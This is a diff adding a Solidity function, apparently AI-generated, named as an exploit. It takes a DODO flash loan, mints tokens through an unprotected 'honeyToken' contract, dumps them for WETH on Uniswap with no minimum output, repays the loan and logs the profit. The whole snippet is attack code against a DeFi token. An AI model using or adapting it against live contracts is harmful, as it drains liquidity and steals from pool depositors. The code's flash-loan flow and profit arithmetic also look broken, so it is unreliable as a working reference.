@@ -1,0 +1,38 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Start with a flashloan of valuableToken
+    // We will do this by interacting with the flashloan provider.
+
+    // Assuming we flashloans the maximum debt amount
+    IDODO(flashloanProvider).flashLoan(amount, 0, address(this), "");
+
+    // After receiving the flashloanableTokens, we will generate more tokens through the honeyToken contract.
+    IhoneyToken(token).mint(address(this), amount);
+
+    // After minting new tokens, we can now swap the tokens to receive WETH back.
+    address[] memory path = new address[](2);
+    path[0] = address(token); // honeyToken
+    path[1] = address(valuableToken); // WETH
+
+    uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        amount, // amount of honeyToken
+        0, // accepting any amount of WETH
+        path,
+        address(this),
+        block.timestamp + 15 // timeout
+    );
+
+    // At this point, we should have WETH in our balance.
+    // We need to check how much WETH we have and repay the flashloan.
+    uint256 wethBalance = valuableToken.balanceOf(address(this));
+
+    // Transfer the flashloan amount back.
+    IERC20(valuableToken).transfer(flashloanProvider, amount);
+
+    // Any remaining WETH is profit.
+    // Logging the profits
+    console.log("Profit: ", wethBalance - amount);
+}
+</executeExploitCode>
+```
